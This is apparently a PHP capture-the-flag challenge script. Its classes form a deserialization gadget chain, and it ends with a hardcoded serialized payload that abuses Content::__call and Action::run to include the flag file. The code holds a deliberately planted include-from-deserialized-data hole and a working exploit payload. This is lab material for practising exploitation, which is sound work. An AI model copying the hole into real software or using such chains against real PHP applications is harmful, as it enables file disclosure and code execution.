<?php
// flag in /tmp/flag.php
class Modifier {
    public function __invoke(){
        include("index.php");
    }
}
class Action {
    protected $checkAccess;
    protected $id;
    public function run()
    {
        if(strpos($this->checkAccess, 'upload') !== false){
            echo "error path";
            exit();
        }
        if ($this->id !== 0 && $this->id !== 1) {
            switch($this->id) {
                case 0:
                    if ($this->checkAccess) {
                        include($this->checkAccess);
                    }
                    break;
                case 1:
                    throw new Exception("id invalid in ".__CLASS__.__FUNCTION__);
                    break;
                default:
                    break;
            }
        }
    }
}
class Content {
    public $formatters;
    public function getFormatter($formatter)
    {
        if (isset($this->formatters[$formatter])) {
            return $this->formatters[$formatter];
        }
        foreach ($this->providers as $provider) {
            if (method_exists($provider, $formatter)) {
                $this->formatters[$formatter] = array($provider, $formatter);
                return $this->formatters[$formatter];
            }
        }
        throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
    }
    public function __call($name, $arguments)
    {
        return call_user_func_array($this->getFormatter($name), $arguments);
    }
}
class Show{
    public $source;
    public $str;
    public $reader;
    public function __construct($file='index.php') {
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString() {
        $this->str->reset();
    }

    public function __wakeup() {

        if(preg_match("/gopher|phar|http|file|ftp|dict|\.\./i", $this->source)) {
            throw new Exception('invalid protocol found in '.__CLASS__);
        }
    }
    public function reset() {
        if ($this->reader !== null) {
            $this->reader->close();
        }
    }
}
highlight_file(__FILE__);

$A='O%3A7%3A%22Content%22%3A2%3A%7Bs%3A10%3A%22formatters%22%3Ba%3A1%3A%7Bs%3A3%3A%22run%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A6%3A%22Action%22%3A2%3A%7Bs%3A14%3A%22%00%2A%00checkAccess%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22%00%2A%00id%22%3Bs%3A1%3A%220%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7Ds%3A9%3A%22providers%22%3Ba%3A1%3A%7Bi%3A0%3Br%3A4%3B%7D%7D';
echo urldecode(unserialize($A));